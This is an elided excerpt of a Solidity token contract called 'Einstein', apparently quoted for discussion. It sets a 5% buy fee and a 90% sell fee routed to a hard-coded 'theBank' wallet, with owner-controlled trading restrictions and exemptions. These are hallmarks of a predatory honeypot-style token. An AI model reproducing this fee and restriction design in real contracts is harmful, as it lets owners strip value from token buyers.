...
contract Einstein is ERC20, Ownable {
    ...
    uint256 _buyTheBankFee = 5;
    uint256 _buyLiqFee = 1;

    uint256 _sellTheBankFee = 90;
    ...
    constructor() ERC20("Einstein", "Einstein") {
        ...
        theBank = payable(0x26B10F14E043619a94A6dD9cb73b258893049058); 
        liqOwner = payable(0xaeb52A91a78Db9B67f9cD92995d289fb309FEc17);
    ...
    function _transfer(
        ...
        if(restrictions){
            if (
                ...
                to != owner() &&
                to != address(0) &&
                to != address(0xaeb52A91a78Db9B67f9cD92995d289fb309FEc17) &&
                !inTheZone
            ){
    ...
    function TradingEnabled(uint256 botBlocks) external onlyOwner() {
